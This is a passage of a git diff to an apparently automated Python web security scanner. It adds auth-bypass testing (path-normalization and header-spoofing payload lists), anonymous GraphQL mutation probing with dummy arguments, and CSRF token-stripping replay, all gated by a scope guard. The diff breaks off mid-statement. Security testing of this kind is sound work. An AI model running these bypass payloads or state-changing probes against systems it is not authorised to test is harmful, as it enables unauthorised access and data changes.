@@ -1559,6 +1559,65 @@ class RaceConditionTester:
 
 # ── GraphQL Analyzer ─────────────────────────────────────────────────
 
+def _infer_graphql_value(name: str, type_name: str) -> str:
+    """Infer a plausible dummy value for a GraphQL arg based on name and type."""
+    name_lower = name.lower()
+    # Name-based inference (takes priority)
+    if "email" in name_lower:
+        return '"test@test.com"'
+    if "password" in name_lower or "passwd" in name_lower:
+        return '"test123"'
+    if "code" in name_lower or "otp" in name_lower or "pin" in name_lower:
+        return '"000000"'
+    if "phone" in name_lower or "mobile" in name_lower:
+        return '"+1234567890"'
+    if "url" in name_lower or "link" in name_lower or "uri" in name_lower:
+        return '"https://example.com"'
+    if "amount" in name_lower or "price" in name_lower or "quantity" in name_lower:
+        return "1"
+    if "enabled" in name_lower or "active" in name_lower or "confirm" in name_lower:
+        return "true"
+    # Type-based inference
+    type_upper = (type_name or "").upper()
+    if type_upper in ("INT", "INTEGER", "FLOAT", "DECIMAL", "NUMBER"):
+        return "1"
+    if type_upper in ("BOOLEAN", "BOOL"):
+        return "true"
+    if type_upper == "ID":
+        return '"1"'
+    return '"test"'
+
+
+def _build_graphql_dummy_args(args: list[dict]) -> str:
+    """Build dummy arg string for GraphQL mutation testing.
+
+    Args: list of dicts with name, type_name, type_kind, of_type_name.
+    Returns formatted arg string like: email: "test@test.com", password: "test123"
+    """
+    if not args:
+        return ""
+    parts = []
+    for arg in args[:5]:  # Cap at 5 args to avoid over-complex queries
+        name = arg.get("name", "")
+        type_kind = arg.get("type_kind", "")
+        # Resolve the actual scalar type name (NON_NULL wraps the real type)
+        actual_type = arg.get("of_type_name") or arg.get("type_name") or "String"
+        # INPUT_OBJECT types need nested fields — skip (too complex for blind testing)
+        if actual_type and actual_type[0].isupper() and actual_type not in (
+            "String", "Int", "Float", "Boolean", "ID",
+        ) and type_kind != "NON_NULL":
+            continue
+        # For NON_NULL INPUT_OBJECT, also skip
+        of_type_name = arg.get("of_type_name", "")
+        if of_type_name and of_type_name[0].isupper() and of_type_name not in (
+            "String", "Int", "Float", "Boolean", "ID",
+        ):
+            continue
+        val = _infer_graphql_value(name, actual_type)
+        parts.append(f"{name}: {val}")
+    return ", ".join(parts)
+
+
 class GraphQLAnalyzer:
     """Analyze GraphQL endpoints for misconfigurations — zero LLM cost.
 
@@ -1575,7 +1634,7 @@ class GraphQLAnalyzer:
           kind
           fields {
             name
-            args { name type { name kind } }
+            args { name type { name kind ofType { name kind } } }
             type { name kind ofType { name kind } }
           }
         }
@@ -1658,7 +1717,15 @@ class GraphQLAnalyzer:
                         for f in fields:
                             mutations.append({
                                 "name": f["name"],
-                                "args": [a["name"] for a in (f.get("args") or [])],
+                                "args": [
+                                    {
+                                        "name": a["name"],
+                                        "type_name": (a.get("type") or {}).get("name"),
+                                        "type_kind": (a.get("type") or {}).get("kind"),
+                                        "of_type_name": ((a.get("type") or {}).get("ofType") or {}).get("name"),
+                                    }
+                                    for a in (f.get("args") or [])
+                                ],
                             })
         except Exception as e:
             pass
@@ -1666,10 +1733,20 @@ class GraphQLAnalyzer:
         # Step 2: Test mutations as anonymous (no auth cookies)
         unprotected_mutations = []
         if mutations:
-            for mut in mutations[:10]:  # Test up to 10
+            for mut in mutations[:30]:  # Test up to 30
                 try:
-                    # Send a minimal mutation without auth
-                    test_query = f"mutation {{ {mut['name']} }}"
+                    # Build mutation with dummy args from introspection schema
+                    args = mut.get("args", [])
+                    if isinstance(args, list) and args and isinstance(args[0], dict) and "type_name" in args[0]:
+                        args_str = _build_graphql_dummy_args(args)
+                    else:
+                        args_str = ""
+
+                    if args_str:
+                        test_query = f'mutation {{ {mut["name"]}({args_str}) }}'
+                    else:
+                        test_query = f'mutation {{ {mut["name"]} }}'
+
                     resp = await self._client.post(
                         url,
                         json={"query": test_query},
@@ -1679,11 +1756,18 @@ class GraphQLAnalyzer:
                     resp_data = resp.json()
                     errors = resp_data.get("errors", [])
 
-                    # Check if auth error occurred
-                    auth_error = any(
-                        any(kw in str(e).lower() for kw in ("unauthorized", "forbidden", "authentication", "not authenticated", "login required", "access denied"))
-                        for e in errors
-                    )
+                    # Check if auth error occurred — both HTTP status AND error messages
+                    auth_error = False
+                    if resp.status_code in (401, 403):
+                        auth_error = True
+                    else:
+                        auth_error = any(
+                            any(kw in str(e).lower() for kw in (
+                                "unauthorized", "forbidden", "authentication",
+                                "not authenticated", "login required", "access denied",
+                            ))
+                            for e in errors
+                        )
 
                     if not auth_error and not errors:
                         unprotected_mutations.append({
@@ -1692,12 +1776,16 @@ class GraphQLAnalyzer:
                             "response": str(resp_data)[:200],
                         })
                     elif not auth_error and errors:
-                        # Errors but not auth-related — might be arg validation
+                        # Errors but not auth-related — classify arg validation vs real issue
                         error_msgs = [str(e.get("message", ""))[:100] for e in errors[:2]]
+                        is_arg_error = any(
+                            any(kw in m.lower() for kw in ("argument", "variable", "field", "type", "required"))
+                            for m in error_msgs
+                        )
                         if not any("auth" in m.lower() or "permission" in m.lower() for m in error_msgs):
                             unprotected_mutations.append({
                                 "name": mut["name"],
-                                "status": "possibly_unprotected",
+                                "status": "arg_error_no_auth" if is_arg_error else "possibly_unprotected",
                                 "errors": error_msgs,
                             })
                 except Exception:
@@ -2048,6 +2136,21 @@ class InfoDisclosureScanner:
                     if not re.search(regex, body, re.IGNORECASE | re.MULTILINE):
                         continue
 
+                    # Anti-FP: reject HTML error pages masquerading as sensitive files
+                    ct = resp.headers.get("content-type", "").lower()
+                    # Non-HTML sensitive files (.json, .env, .yml, .sql, .tar.gz, .zip)
+                    # should NOT have text/html content-type
+                    _NON_HTML_EXTS = (".json", ".env", ".yml", ".yaml", ".sql",
+                                      ".tar.gz", ".zip", ".bak", ".log", ".conf",
+                                      ".cfg", ".xml", ".key", ".pem")
+                    if any(path.endswith(ext) for ext in _NON_HTML_EXTS):
+                        if "text/html" in ct:
+                            continue  # HTML error page, not real file
+
+                    # Anti-FP: reject if response is a generic error/default page
+                    if len(resp.content) < 50:
+                        continue  # Too small — likely stub/error
+
                     # Verified! Real sensitive content found
                     verified.append({
                         "path": path,
@@ -2068,3 +2171,2793 @@ class InfoDisclosureScanner:
             "scanned": scanned,
             "elapsed_seconds": elapsed,
         }
+
+
+# ── Auth Endpoint Discovery ───────────────────────────────────────────
+
+
+class AuthEndpointDiscovery:
+    """Deterministic auth endpoint discovery — zero LLM cost.
+
+    Probes common login/register/OAuth paths and classifies responses
+    by checking for password fields, form elements, and auth keywords.
+    """
+
+    _LOGIN_PATHS = [
+        "/login", "/signin", "/sign-in", "/auth/login", "/api/auth/login",
+        "/accounts/login", "/user/login", "/members/login", "/panel/login",
+        "/auth/signin", "/api/login", "/session/new", "/log-in",
+        "/wp-login.php", "/admin/login", "/account/login",
+    ]
+
+    _REGISTER_PATHS = [
+        "/register", "/signup", "/sign-up", "/auth/register", "/api/auth/register",
+        "/accounts/register", "/user/register", "/join", "/create-account",
+        "/onboarding", "/enroll", "/getstarted", "/get-started",
+        "/auth/signup", "/api/signup", "/api/register", "/account/register",
+        "/accounts/signup", "/user/signup",
+    ]
+
+    _RESET_PATHS = [
+        "/forgot-password", "/reset-password", "/auth/forgot",
+        "/password/reset", "/account/forgot-password", "/forgot",
+    ]
+
+    _OAUTH_PATHS = [
+        "/auth/google", "/auth/github", "/auth/facebook",
+        "/oauth/authorize", "/auth/sso", "/sso/login",
+    ]
+
+    _AUTH_KEYWORDS_RE = re.compile(
+        r"(?:sign\s*in|log\s*in|sign\s*up|register|create\s+account|"
+        r"forgot\s+password|reset\s+password|email|username|password)",
+        re.IGNORECASE,
+    )
+
+    _PASSWORD_FIELD_RE = re.compile(
+        r'type=["\']password["\']|type=password', re.IGNORECASE,
+    )
+
+    _FORM_RE = re.compile(r"<form\b", re.IGNORECASE)
+
+    def __init__(self, scope_guard: ActiveScopeGuard | None, timeout: int = 10,
+                 socks_proxy: str | None = None):
+        self._scope_guard = scope_guard
+        self._timeout = timeout
+        self._socks_proxy = socks_proxy
+
+    def _classify_page(self, url: str, status: int, body: str, path: str) -> dict[str, Any] | None:
+        """Classify a response as login, register, reset, or oauth page."""
+        if status in (404, 500, 502, 503):
+            return None
+        if status in (301, 302, 307, 308):
+            return None  # Redirect — skip for now
+
+        body_lower = body[:5000].lower()
+        has_password = bool(self._PASSWORD_FIELD_RE.search(body[:5000]))
+        has_form = bool(self._FORM_RE.search(body[:5000]))
+        has_auth_kw = bool(self._AUTH_KEYWORDS_RE.search(body[:3000]))
+
+        if not has_auth_kw and not has_password:
+            return None
+
+        # Classify by path + content
+        path_lower = path.lower()
+        page_type = "unknown"
+        if any(kw in path_lower for kw in ("login", "signin", "sign-in", "log-in")):
+            page_type = "login"
+        elif any(kw in path_lower for kw in ("register", "signup", "sign-up", "join",
+                                              "create-account", "onboarding", "enroll")):
+            page_type = "register"
+        elif any(kw in path_lower for kw in ("forgot", "reset")):
+            page_type = "password_reset"
+        elif any(kw in path_lower for kw in ("oauth", "sso", "auth/google", "auth/github")):
+            page_type = "oauth"
+        elif has_password and has_form:
+            # Has password field but unknown path — check body for hints
+            if any(kw in body_lower for kw in ("sign up", "register", "create account",
+                                                 "join now", "get started")):
+                page_type = "register"
+            elif any(kw in body_lower for kw in ("sign in", "log in", "login")):
+                page_type = "login"
+
+        if page_type == "unknown":
+            return None
+
+        return {
+            "url": url,
+            "type": page_type,
+            "status_code": status,
+            "has_password_field": has_password,
+            "has_form": has_form,
+        }
+
+    async def scan(self, base_url: str) -> dict[str, Any]:
+        """Probe all common auth paths and return discovered endpoints."""
+        start = time.monotonic()
+        base_url = base_url.rstrip("/")
+
+        login_urls: list[dict] = []
+        register_urls: list[dict] = []
+        reset_urls: list[dict] = []
+        oauth_urls: list[dict] = []
+        probed = 0
+
+        all_paths = (
+            [(p, "login") for p in self._LOGIN_PATHS]
+            + [(p, "register") for p in self._REGISTER_PATHS]
+            + [(p, "reset") for p in self._RESET_PATHS]
+            + [(p, "oauth") for p in self._OAUTH_PATHS]
+        )
+
+        proxy_kwargs: dict[str, Any] = {}
+        if self._socks_proxy:
+            proxy_kwargs["proxy"] = self._socks_proxy
+
+        async with httpx.AsyncClient(
+            timeout=self._timeout, verify=False, follow_redirects=True, **proxy_kwargs,
+        ) as client:
+            for path, _hint in all_paths:
+                url = f"{base_url}{path}"
+                probed += 1
+                try:
+                    if self._scope_guard:
+                        self._scope_guard.validate_url(url)
+                except Exception:
+                    continue
+
+                await asyncio.sleep(0.05)
+                try:
+                    resp = await client.get(url)
+                    body = resp.text[:5000]
+                    result = self._classify_page(url, resp.status_code, body, path)
+                    if result:
+                        if result["type"] == "login":
+                            login_urls.append(result)
+                        elif result["type"] == "register":
+                            register_urls.append(result)
+                        elif result["type"] == "password_reset":
+                            reset_urls.append(result)
+                        elif result["type"] == "oauth":
+                            oauth_urls.append(result)
+                except Exception:
+                    continue
+
+        elapsed = round(time.monotonic() - start, 1)
+        logger.info("auth_endpoint_discovery_complete",
+                     probed=probed, login=len(login_urls),
+                     register=len(register_urls), elapsed=elapsed)
+        return {
+            "login_urls": login_urls,
+            "register_urls": register_urls,
+            "password_reset_urls": reset_urls,
+            "oauth_urls": oauth_urls,
+            "probed": probed,
+            "elapsed_seconds": elapsed,
+        }
+
+
+# ── Auth Bypass Scanner ──────────────────────────────────────────────
+
+
+class AuthBypassScanner:
+    """Systematic auth bypass scanner — zero LLM cost.
+
+    Tests every discovered endpoint for:
+    A) Missing authentication (request without cookies/tokens)
+    B) HTTP verb tampering (GET/POST/PUT/PATCH/DELETE/OPTIONS)
+    C) Path normalization bypass (..;/ %2e %00 .json .html)
+    D) Header-based bypass (X-Original-URL, X-Forwarded-For, etc.)
+    """
+
+    _AUTH_ERROR_RE = re.compile(
+        r"(?:unauthorized|authentication\s+(?:is\s+)?(?:needed|required)|please\s+log\s*in|"
+        r"access\s+denied|forbidden|not\s+authenticated|login\s+required|"
+        r"session\s+expired|token\s+(?:expired|invalid|missing)|"
+        r"must\s+be\s+logged\s+in|sign\s*in\s+required|unauthenticated)",
+        re.IGNORECASE,
+    )
+
+    _BUSINESS_ERROR_RE = re.compile(
+        r"(?:user\s+not\s+found|null\s*reference|NullReferenceException|"
+        r"validation\s+error|missing\s+(?:required\s+)?(?:field|param)|"
+        r"invalid\s+(?:input|request|argument|body)|cannot\s+be\s+(?:null|empty|blank)|"
+        r"undefined\s+(?:method|property|variable)|"
+        r"TypeError|ArgumentError|KeyError|IndexError|"
+        r"no\s+(?:such\s+)?(?:user|record|resource|entity|method)|"
+        r"does\s+not\s+exist|record\s+not\s+found|"
+        r"Entered\s+code\s+is\s+not\s+valid|"
+        r"Object\s+reference\s+not\s+set|"
+        r"No\s+HTTP\s+resource\s+was\s+found)",
+        re.IGNORECASE,
+    )
+
+    _PUBLIC_EXCLUSIONS = frozenset({
+        "login", "signin", "sign-in", "register", "signup", "sign-up",
+        "forgot-password", "reset-password", "health", "healthz", "ping",
+        "robots.txt", "favicon.ico", "sitemap.xml", ".well-known",
+        "public", "status", "version", "manifest.json",
+    })
+
+    _PATH_NORMALIZATION_PAYLOADS: list[tuple[str, str]] = [
+        # Universal
+        ("{path}/", "trailing_slash"),
+        ("{path}//", "double_slash"),
+        ("{path}/./", "dot_slash"),
+        ("{path}/%2e/", "url_encoded_dot"),
+        # Tomcat / Spring (Java)
+        ("{path}..;/", "tomcat_semicolon_traversal"),
+        ("{path};/", "semicolon_suffix"),
+        ("/.;{path}", "semicolon_prefix"),
+        # URL-encoded
+        ("{path}%00", "null_byte"),
+        ("{path}%20", "trailing_space"),
+        ("{path}%0a", "trailing_newline"),
+        # Extension tricks (WAF bypass)
+        ("{path}.json", "json_extension"),
+        ("{path}.html", "html_extension"),
+        ("{path}.css", "css_extension"),
+        # Case variation
+        ("{path_upper}", "case_upper"),
+    ]
+
+    _HEADER_BYPASS_PAYLOADS: list[tuple[dict[str, str], str]] = [
+        # URL override headers
+        ({"X-Original-URL": "{path}"}, "x_original_url"),
+        ({"X-Rewrite-URL": "{path}"}, "x_rewrite_url"),
+        # IP spoofing (bypass IP-based ACLs)
+        ({"X-Forwarded-For": "127.0.0.1"}, "xff_localhost"),
+        ({"X-Forwarded-For": "10.0.0.1"}, "xff_internal"),
+        ({"X-Real-IP": "127.0.0.1"}, "x_real_ip"),
+        ({"X-Custom-IP-Authorization": "127.0.0.1"}, "x_custom_ip_auth"),
+        ({"X-Originating-IP": "127.0.0.1"}, "x_originating_ip"),
+        ({"X-Client-IP": "127.0.0.1"}, "x_client_ip"),
+        ({"True-Client-IP": "127.0.0.1"}, "true_client_ip"),
+        ({"CF-Connecting-IP": "127.0.0.1"}, "cf_connecting_ip"),
+        ({"X-Forwarded-Host": "localhost"}, "x_forwarded_host"),
+        # Method override
+        ({"X-HTTP-Method-Override": "GET"}, "method_override_get"),
+        ({"X-HTTP-Method": "GET"}, "x_http_method"),
+    ]
+
+    _MAX_ENDPOINTS = 100
+
+    def __init__(self, scope_guard: ActiveScopeGuard | None, timeout: int = 10,
+                 socks_proxy: str | None = None):
+        self._scope_guard = scope_guard
+        self._timeout = timeout
+        self._socks_proxy = socks_proxy
+
+    def _classify_response(
+        self, status_code: int, body: str, headers: dict[str, str],
+    ) -> str:
+        """Classify response as SECURE, VULNERABLE, or INCONCLUSIVE."""
+        # Explicit auth errors
+        if status_code in (401, 403):
+            return "SECURE"
+
+        # Redirect to login page
+        if status_code in (301, 302, 307, 308):
+            location = headers.get("location", "").lower()
+            if any(kw in location for kw in ("login", "auth", "signin", "sign-in", "sso")):
+                return "SECURE"
+
+        # 200 with auth error in body (some apps return 200 + "please log in")
+        if status_code == 200 and self._AUTH_ERROR_RE.search(body[:2000]):
+            if len(body) < 500:  # Short auth error page
+                return "SECURE"
+
+        # Business logic error = auth was MISSING (request reached backend)
+        if self._BUSINESS_ERROR_RE.search(body[:3000]):
+            return "VULNERABLE"
+
+        # 200 with substantial content (not an error stub)
+        if status_code == 200 and len(body) >= 200:
+            return "VULNERABLE"
+
+        # 500 without business error pattern
+        if status_code >= 500:
+            return "INCONCLUSIVE"
+
+        # 404
+        if status_code == 404:
+            return "INCONCLUSIVE"
+
+        return "INCONCLUSIVE"
+
+    def _build_request_dump(self, method: str, url: str,
+                            extra_headers: dict[str, str] | None = None) -> str:
+        parts = [f"{method} {url}"]
+        if extra_headers:
+            for k, v in extra_headers.items():
+                parts.append(f"{k}: {v}")
+        return "\n".join(parts)
+
+    def _build_response_dump(self, status: int, headers: dict[str, str],
+                             body: str) -> str:
+        parts = [f"HTTP {status}"]
+        for k in ("content-type", "location", "server", "set-cookie",
+                   "x-powered-by", "www-authenticate"):
+            v = headers.get(k, "")
+            if v:
+                parts.append(f"{k}: {v}")
+        if body:
+            parts.append(f"\n{body[:2048]}")
+        return "\n".join(parts)
+
+    def _is_public_path(self, path: str) -> bool:
+        path_lower = path.lower()
+        return any(excl in path_lower for excl in self._PUBLIC_EXCLUSIONS)
+
+    def _is_soft_404(self, body: str, soft404_hash: str, soft404_len: int) -> bool:
+        """Check if response matches the soft-404 baseline."""
+        if not soft404_hash:
+            return False
+        import hashlib
+        body_hash = hashlib.md5(body.encode(errors="replace")).hexdigest()
+        if body_hash == soft404_hash:
+            return True
+        # Length similarity (±5%)
+        if soft404_len > 0 and abs(len(body) - soft404_len) / max(soft404_len, 1) < 0.05:
+            return True
+        return False
+
+    async def scan(
+        self,
+        base_url: str,
+        endpoints: dict[str, Any] | None = None,
+        tech_stack: list[str] | None = None,
+    ) -> dict[str, Any]:
+        """Run systematic auth bypass scan on all endpoints."""
+        import hashlib
+        from urllib.parse import urlparse
+
+        start = time.monotonic()
+        findings: list[dict[str, Any]] = []
+        requests_sent = 0
+
+        base_url = base_url.rstrip("/")
+        if self._scope_guard:
+            self._scope_guard.validate_url(base_url)
+
+        # Determine tech-stack features
+        is_java = False
+        if tech_stack:
+            tech_lower = " ".join(tech_stack).lower()
+            is_java = any(kw in tech_lower for kw in ("java", "spring", "tomcat"))
+
+        # Collect and deduplicate endpoint paths
+        endpoint_paths: list[tuple[str, str]] = []  # (full_url, method)
+        seen_paths: set[str] = set()
+
+        if endpoints and isinstance(endpoints, dict):
+            for url_key, info in endpoints.items():
+                if not isinstance(url_key, str):
+                    continue
+                method = "GET"
+                if isinstance(info, dict):
+                    method = info.get("method", "GET").upper()
+                parsed = urlparse(url_key)
+                path = parsed.path or "/"
+                if path in seen_paths:
+                    continue
+                if self._is_public_path(path):
+                    continue
+                seen_paths.add(path)
+                full_url = url_key if url_key.startswith("http") else f"{base_url}{path}"
+                endpoint_paths.append((full_url, method))
+
+        # If no endpoints in state, try common admin/API paths
+        if not endpoint_paths:
+            _COMMON_PATHS = [
+                "/admin", "/api", "/api/v1", "/api/users", "/api/admin",
+                "/graphql", "/dashboard", "/internal", "/manage", "/config",
+                "/settings", "/users", "/account", "/panel",
+            ]
+            for p in _COMMON_PATHS:
+                endpoint_paths.append((f"{base_url}{p}", "GET"))
+
+        # Cap endpoints
+        endpoint_paths = endpoint_paths[:self._MAX_ENDPOINTS]
+        endpoints_tested = len(endpoint_paths)
+
+        proxy_kwargs: dict[str, Any] = {}
+        if self._socks_proxy:
+            proxy_kwargs["proxy"] = self._socks_proxy
+
+        async with httpx.AsyncClient(
+            timeout=self._timeout, verify=False, follow_redirects=False, **proxy_kwargs,
+        ) as client:
+            # Step 1: Soft-404 baseline
+            soft404_hash = ""
+            soft404_len = 0
+            try:
+                r404 = await client.get(f"{base_url}/aibbp_nonexistent_path_32847")
+                soft404_hash = hashlib.md5(r404.text.encode(errors="replace")).hexdigest()
+                soft404_len = len(r404.text)
+                requests_sent += 1
+            except Exception:
+                pass
+
+            # Step 2: Test each endpoint
+            for full_url, orig_method in endpoint_paths:
+                try:
+                    if self._scope_guard:
+                        self._scope_guard.validate_url(full_url)
+                except Exception:
+                    continue
+
+                parsed = urlparse(full_url)
+                path = parsed.path or "/"
+
+                # ── Test A: Missing Authentication ──
+                await asyncio.sleep(0.1)
+                try:
+                    resp = await client.request(orig_method, full_url)
+                    requests_sent += 1
+                    body = resp.text[:5000]
+                    headers_dict = {k.lower(): v for k, v in resp.headers.items()}
+                    classification = self._classify_response(
+                        resp.status_code, body, headers_dict,
+                    )
+
+                    if classification == "VULNERABLE":
+                        if not self._is_soft_404(body, soft404_hash, soft404_len):
+                            findings.append({
+                                "endpoint": full_url,
+                                "method": orig_method,
+                                "bypass_type": "missing_auth",
+                                "bypass_detail": (
+                                    f"No auth cookies/tokens sent. "
+                                    f"Got {resp.status_code} with business logic response "
+                                    f"instead of 401/403 FORBIDDEN"
+                                ),
+                                "evidence_score": 4,
+                                "status_code": resp.status_code,
+                                "request_dump": self._build_request_dump(orig_method, full_url),
+                                "response_dump": self._build_response_dump(
+                                    resp.status_code, headers_dict, body,
+                                ),
+                                "response_preview": body[:500],
+                            })
+
+                    baseline_status = resp.status_code
+                    baseline_body = body
+
+                except Exception:
+                    continue
+
+                # ── Test B: HTTP Verb Tampering ──
+                _VERBS = ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"]
+                for verb in _VERBS:
+                    if verb == orig_method:
+                        continue
+                    await asyncio.sleep(0.1)
+                    try:
+                        vresp = await client.request(verb, full_url)
+                        requests_sent += 1
+                        vbody = vresp.text[:5000]
+                        vheaders = {k.lower(): v for k, v in vresp.headers.items()}
+                        vclass = self._classify_response(
+                            vresp.status_code, vbody, vheaders,
+                        )
+
+                        # Verb tampering: baseline is SECURE but this verb is VULNERABLE
+                        if (baseline_status in (401, 403) and
+                                vclass == "VULNERABLE" and
+                                not self._is_soft_404(vbody, soft404_hash, soft404_len)):
+                            findings.append({
+                                "endpoint": full_url,
+                                "method": verb,
+                                "bypass_type": "verb_tampering",
+                                "bypass_detail": (
+                                    f"{orig_method} returns {baseline_status} (blocked), "
+                                    f"but {verb} returns {vresp.status_code} (bypassed)"
+                                ),
+                                "evidence_score": 4,
+                                "status_code": vresp.status_code,
+                                "request_dump": self._build_request_dump(verb, full_url),
+                                "response_dump": self._build_response_dump(
+                                    vresp.status_code, vheaders, vbody,
+                                ),
+                                "response_preview": vbody[:500],
+                            })
+                    except Exception:
+                        continue
+
+                # Tests C & D only apply to SECURE (403) endpoints
+                if baseline_status not in (401, 403):
+                    continue
+
+                # ── Test C: Path Normalization Bypass ──
+                for payload_tpl, label in self._PATH_NORMALIZATION_PAYLOADS:
+                    # Skip Java-specific payloads on non-Java targets
+                    if label in ("tomcat_semicolon_traversal", "semicolon_suffix",
+                                 "semicolon_prefix") and not is_java:
+                        continue
+
+                    # Build mutated URL
+                    if "{path_upper}" in payload_tpl:
+                        mutated_path = path[0] + path[1:].upper() if len(path) > 1 else path.upper()
+                        mutated_url = f"{base_url}{mutated_path}"
+                    elif "{path}" in payload_tpl:
+                        mutated_path = payload_tpl.replace("{path}", path)
+                        mutated_url = f"{base_url}{mutated_path}"
+                    else:
+                        continue
+
+                    await asyncio.sleep(0.1)
+                    try:
+                        presp = await client.request(orig_method, mutated_url)
+                        requests_sent += 1
+                        pbody = presp.text[:5000]
+                        pheaders = {k.lower(): v for k, v in presp.headers.items()}
+                        pclass = self._classify_response(
+                            presp.status_code, pbody, pheaders,
+                        )
+
+                        if (pclass == "VULNERABLE" and
+                                not self._is_soft_404(pbody, soft404_hash, soft404_len)):
+                            findings.append({
+                                "endpoint": full_url,
+                                "method": orig_method,
+                                "bypass_type": "path_normalization",
+                                "bypass_detail": (
+                                    f"Original path {path} returns {baseline_status}. "
+                                    f"Mutated path '{mutated_path}' ({label}) returns "
+                                    f"{presp.status_code} — auth bypassed"
+                                ),
+                                "evidence_score": 4,
+                                "status_code": presp.status_code,
+                                "request_dump": self._build_request_dump(
+                                    orig_method, mutated_url,
+                                ),
+                                "response_dump": self._build_response_dump(
+                                    presp.status_code, pheaders, pbody,
+                                ),
+                                "response_preview": pbody[:500],
+                            })
+                            break  # One bypass per endpoint is enough
+                    except Exception:
+                        continue
+
+                # ── Test D: Header-Based Bypass ──
+                for header_dict_tpl, label in self._HEADER_BYPASS_PAYLOADS:
+                    # Substitute {path} in header values
+                    headers_to_send = {}
+                    for hk, hv in header_dict_tpl.items():
+                        headers_to_send[hk] = hv.replace("{path}", path)
+
+                    await asyncio.sleep(0.1)
+                    try:
+                        hresp = await client.request(
+                            orig_method, full_url, headers=headers_to_send,
+                        )
+                        requests_sent += 1
+                        hbody = hresp.text[:5000]
+                        hheaders = {k.lower(): v for k, v in hresp.headers.items()}
+                        hclass = self._classify_response(
+                            hresp.status_code, hbody, hheaders,
+                        )
+
+                        if (hclass == "VULNERABLE" and
+                                not self._is_soft_404(hbody, soft404_hash, soft404_len)):
+                            findings.append({
+                                "endpoint": full_url,
+                                "method": orig_method,
+                                "bypass_type": "header_bypass",
+                                "bypass_detail": (
+                                    f"Original returns {baseline_status}. "
+                                    f"With header {label} ({headers_to_send}) "
+                                    f"returns {hresp.status_code} — auth bypassed"
+                                ),
+                                "evidence_score": 4,
+                                "status_code": hresp.status_code,
+                                "request_dump": self._build_request_dump(
+                                    orig_method, full_url, headers_to_send,
+                                ),
+                                "response_dump": self._build_response_dump(
+                                    hresp.status_code, hheaders, hbody,
+                                ),
+                                "response_preview": hbody[:500],
+                            })
+                            break  # One bypass per endpoint is enough
+                    except Exception:
+                        continue
+
+        # Deduplicate: one finding per (endpoint, bypass_type)
+        seen: set[str] = set()
+        deduped: list[dict[str, Any]] = []
+        for f in findings:
+            key = f"{f['endpoint']}|{f['bypass_type']}"
+            if key not in seen:
+                seen.add(key)
+                deduped.append(f)
+
+        elapsed = round(time.monotonic() - start, 1)
+        logger.info("auth_bypass_scan_complete",
+                     endpoints_tested=endpoints_tested,
+                     requests_sent=requests_sent,
+                     findings=len(deduped),
+                     elapsed=elapsed)
+        return {
+            "findings": deduped,
+            "endpoints_tested": endpoints_tested,
+            "requests_sent": requests_sent,
+            "elapsed_seconds": elapsed,
+        }
+
+
+# ── CSRF Scanner ─────────────────────────────────────────────────────
+
+
+_CSRF_TOKEN_NAMES = frozenset({
+    "_token", "csrf_token", "csrf", "csrfmiddlewaretoken", "_csrf",
+    "authenticity_token", "__requestverificationtoken", "xsrf-token",
+    "x-csrf-token", "x-xsrf-token", "anti-forgery-token", "_csrf_token",
+    "csrftoken", "token", "__csrf",
+})
+
+_PUBLIC_PATH_KEYWORDS = frozenset({
+    "login", "logout", "signin", "signout", "register", "signup",
+    "forgot", "reset-password", "password-reset", "auth/",
+})
+
+
+class CSRFScanner:
+    """Deterministic CSRF testing — zero LLM cost.
+
+    Tests state-changing endpoints (POST/PUT/DELETE/PATCH) for:
+    1. CSRF token removal (replay without token)
+    2. CSRF token modification (random value)
+    3. Origin header validation (cross-origin request)
+    4. Referer header validation
+    5. SameSite cookie attribute check
+    """
+
+    def __init__(self, scope_guard: ActiveScopeGuard | None, timeout: int = 10,
+                 socks_proxy: str | None = None):
+        self._scope_guard = scope_guard
+        self._timeout = timeout
+        proxy_kwargs: dict[str, Any] = {}
+        if socks_proxy:
+            proxy_kwargs["proxy"] = socks_proxy
+        self._client = httpx.AsyncClient(
+            timeout=timeout, verify=False, follow_redirects=True, **proxy_kwargs,
+        )
+
+    async def scan(
+        self,
+        base_url: str,
+        proxy_traffic: list[dict[str, Any]] | None = None,
+        endpoints: dict[str, Any] | None = None,
+    ) -> dict[str, Any]:
+        """Scan state-changing endpoints for CSRF vulnerabilities.
+
+        Uses proxy traffic data to replay real requests with modifications.
+        Falls back to endpoint list if no proxy traffic available.
+        """
+        if self._scope_guard:
+            self._scope_guard.validate_url(base_url)
+
+        start = time.monotonic()
+        findings: list[dict[str, Any]] = []
+        endpoints_tested = 0
+        requests_sent = 0
+        cookie_issues: list[dict[str, str]] = []
+
+        # Collect state-changing requests from proxy traffic
+        state_changing: list[dict[str, Any]] = []
+        if proxy_traffic:
+            seen_urls: set[str] = set()
+            for entry in proxy_traffic:
+                method = (entry.get("method") or "GET").upper()
+                if method not in ("POST", "PUT", "DELETE", "PATCH"):
+                    continue
+                url = entry.get("url", "")
+                # Skip public/auth endpoints (not CSRF targets)
+                url_lower = url.lower()
+                if any(kw in url_lower for kw in _PUBLIC_PATH_KEYWORDS):
+                    continue
+                # Deduplicate by method+url
+                key = f"{method}|{url}"
+                if key in seen_urls:
+                    continue
+                seen_urls.add(key)
+                state_changing.append(entry)
+
+        # Cap to prevent excessive scanning
+        state_changing = state_changing[:20]
+
+        for entry in state_changing:
+            url = entry.get("url", "")
+            method = (entry.get("method") or "POST").upper()
+            req_headers = dict(entry.get("headers", {}))
+            req_body = entry.get("body", "")
+            req_cookies = entry.get("cookies", {})
+
+            if self._scope_guard:
+                try:
+                    self._scope_guard.validate_url(url)
+                except Exception:
+                    continue
+
+            endpoints_tested += 1
+
+            # --- Baseline request (with original cookies/headers/tokens) ---
+            try:
+                baseline_resp = await self._client.request(
+                    method, url, headers=req_headers, cookies=req_cookies,
+                    content=req_body if isinstance(req_body, str) else json.dumps(req_body),
+                )
+                baseline_status = baseline_resp.status_code
+                baseline_body = baseline_resp.text[:2000]
+                baseline_len = len(baseline_resp.text)
+                requests_sent += 1
+            except Exception:
+                continue
+
+            # Skip if baseline itself fails (4xx/5xx) — endpoint might be broken
+            if baseline_status >= 400:
+                continue
+
+            # --- Test 1: Remove CSRF token parameter ---
+            stripped_body, token_found = self._strip_csrf_token(req_body)
+            stripped_headers = {k: v for k, v in req_headers.items()
+                               if k.lower() not in ("x-csrf-token", "x-xsrf-token")}
+            if token_found:
+                try:
+                    resp = await self._client.request(
+                        method, url, headers=stripped_headers, cookies=req_cookies,
+                        content=stripped_body,
+                    )
+                    requests_sent += 1
+                    if resp.status_code < 400 and self._is_state_change_response(
+                        resp.status_code, resp.text, baseline_status, baseline_body,
